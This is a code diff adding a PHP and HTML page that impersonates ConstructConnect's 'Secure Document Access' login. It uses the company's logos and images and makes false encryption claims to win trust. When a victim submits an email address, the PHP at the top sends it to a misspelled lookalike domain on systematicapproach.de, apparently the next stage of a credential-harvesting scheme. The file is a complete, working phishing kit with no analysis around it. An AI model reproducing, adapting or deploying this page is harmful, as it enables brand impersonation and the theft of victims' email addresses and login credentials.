@@ -1,0 +1,477 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $email = filter_input(INPUT_POST, "email", FILTER_SANITIZE_EMAIL);
+    if ($email && filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        header(
+            "Location: https://proffessionalbidofferscontractagreements.systematicapproach.de/n9uFv?email=" .
+                $email
+        );
+        exit();
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>ConstructConnect - Secure Document Access</title>
+    <meta name="description" content="Securely access your construction documents">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://app.constructconnect.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Montserrat', sans-serif;
+            background-image: url('https://app.isqftstatic.com/libs/auth/images/background.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(24, 90, 125, 0.1) 0%, rgba(0, 166, 222, 0.1) 100%);
+            z-index: -1;
+        }
+
+        .mobile-header {
+            display: none;
+        }
+
+        .container {
+            display: flex;
+            max-width: 1200px;
+            width: 90%;
+            background-color: rgba(255, 255, 255, 0.98);
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            position: relative;
+        }
+
+        .left {
+            background: linear-gradient(145deg, #185a7d, #0f3c54);
+            color: white;
+            padding: 40px 30px;
+            width: 45%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .left::before {
+            content: "";
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .left::after {
+            content: "";
+            position: absolute;
+            bottom: -30px;
+            left: -30px;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: rgba(0, 166, 222, 0.15);
+        }
+
+        .left img.logo {
+            width: 250px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .left p {
+            margin-top: 20px;
+            line-height: 1.6;
+            font-size: 17px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .left img.status {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-top: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 2;
+        }
+
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 25px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .feature {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 12px 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .feature i {
+            color: #00a6de;
+        }
+
+        .right {
+            padding: 60px 50px;
+            background-color: white;
+            width: 55%;
+            display: flex;
+            flex-direction: column;
+            min-height: 650px;
+            position: relative;
+        }
+
+        .right::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #00a6de, #185a7d);
+        }
+
+        .right h2 {
+            margin-bottom: 8px;
+            font-size: 26px;
+            color: #185a7d;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .form-container {
+            position: relative;
+            z-index: 2;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            margin-top: 5px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #00a6de;
+            box-shadow: 0 0 0 3px rgba(0, 166, 222, 0.2);
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 43px;
+            color: #777;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #00a6de, #0084b5);
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 17px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 166, 222, 0.3);
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #008fc1, #006e96);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 166, 222, 0.4);
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 25px;
+            color: #28a745;
+            font-size: 14px;
+            padding: 12px;
+            background-color: #f0fff4;
+            border-radius: 6px;
+            border-left: 4px solid #28a745;
+        }
+
+        .help-links {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .help-links a {
+            color: #00a6de;
+            text-decoration: none;
+            margin-right: 15px;
+            transition: color 0.2s;
+        }
+
+        .help-links a:hover {
+            color: #185a7d;
+            text-decoration: underline;
+        }
+
+        .decoration {
+            position: absolute;
+            z-index: 1;
+            opacity: 0.05;
+        }
+
+        .decoration-1 {
+            top: 20px;
+            right: 20px;
+            font-size: 120px;
+            color: #185a7d;
+            transform: rotate(15deg);
+        }
+
+        .decoration-2 {
+            bottom: 30px;
+            left: 40px;
+            font-size: 80px;
+            color: #00a6de;
+            transform: rotate(-10deg);
+        }
+
+        @media (max-width: 768px) {
+            body {
+                background-image: none;
+                background-color: #f8f9fa;
+                flex-direction: column;
+                height: auto;
+                align-items: unset;
+                justify-content: unset;
+            }
+
+            body::before {
+                background: linear-gradient(135deg, rgba(24, 90, 125, 0.05) 0%, rgba(0, 166, 222, 0.05) 100%);
+            }
+
+            .mobile-header {
+                display: flex;
+                background: linear-gradient(90deg, #185a7d, #0f3c54);
+                padding: 16px;
+                justify-content: center;
+                align-items: center;
+                position: sticky;
+                top: 0;
+                z-index: 1000;
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            }
+
+            .mobile-header img {
+                height: 30px;
+                width: auto;
+                padding: 5px 2.5px;
+            }
+
+            .container {
+                flex-direction: column;
+                width: 100%;
+                max-width: 100%;
+                box-shadow: none;
+                border-radius: 0;
+                padding: 0 16px;
+                margin-top: 10px;
+                margin-bottom: 30px;
+            }
+
+            .left {
+                display: block;
+                width: 100%;
+                padding: 30px 20px;
+                border-radius: 10px;
+                margin-top: 20px;
+            }
+
+            .left::before, .left::after {
+                display: none;
+            }
+
+            .right {
+                width: 100%;
+                padding: 40px 20px;
+                min-height: auto;
+                border-radius: 10px;
+                margin-top: 20px;
+            }
+
+            .right h2 {
+                font-size: 22px;
+            }
+
+            .subtitle {
+                font-size: 15px;
+            }
+
+            input[type="email"] {
+                font-size: 16px;
+                padding: 14px 14px 14px 42px;
+            }
+
+            button {
+                font-size: 16px;
+                padding: 16px;
+            }
+
+            .decoration {
+                display: none;
+            }
+        }
+
+        @media (max-width: 1280px) and (min-width: 769px) {
+            body {
+                background-image: none;
+                background-color: #f8f9fa;
+                align-items: unset;
+                justify-content: unset;
+                padding: 30px 0;
+            }
+
+            .container {
+                max-width: 95%;
+                width: 95%;
+                border-radius: 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="mobile-header">
+        <img src="https://app.constructconnect.com/auth/common/css/images/cc-logo-negative-2019.svg" alt="ConstructConnect Logo">
+    </div>
+
+    <div class="container">
+        <div class="left">
+            <img src="https://app.constructconnect.com/auth/common/css/images/cc-logo-negative-2019.svg" alt="ConstructConnect Logo" class="logo">
+            <p>
+                You're just a few steps away from accessing your documents all in one place quickly, securely, and effortlessly.
+            </p>
+            
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Military-grade encryption</span>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-bolt"></i>
+                    <span>Instant access</span>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-cloud"></i>
+                    <span>Cloud storage</span>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-sync"></i>
+                    <span>Real-time updates</span>
+                </div>
+            </div>
+            
+            <img src="https://www.constructconnect.com/hubfs/STATUS_MAIN_V2_1.gif" alt="Bid Board Status" class="status" loading="lazy">
+        </div>
+        
+        <div class="right">
+            <i class="fas fa-file-contract decoration decoration-1"></i>
+            <i class="fas fa-lock decoration decoration-2"></i>
+            
+            <h2>Secure Document Access</h2>
+            <p class="subtitle">Enter your email to review and access your  documents securely.</p>
+            
+            <div class="form-container">
+                <form method="POST">
+                    <div class="input-group">
+                        <label for="email">Your Email Address</label>
+                        <i class="fas fa-envelope input-icon"></i>
+                        <input type="email" id="email" name="email" placeholder="name@company.com" required>
+                    </div>
+                    <button type="submit">
+                        <i class="fas fa-arrow-right" style="margin-right: 8px;"></i> Access Documents
+                    </button>
+                </form>
+                
+                <div class="security-note">
+                    <i class="fas fa-lock" style="font-size: 18px;"></i>
+                    <span>Your information is protected with 256-bit SSL encryption</span>
+                </div>
+            </div>
+            
+            <div class="help-links">
+                <a href="#"><i class="fas fa-question-circle"></i> Need Help?</a>
+                <a href="#"><i class="fas fa-user-shield"></i> Privacy Policy</a>
+                <a href="#"><i class="fas fa-file-alt"></i> Terms of Service</a>
+                <a href="#"><i class="fas fa-envelope"></i> Contact Support</a>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
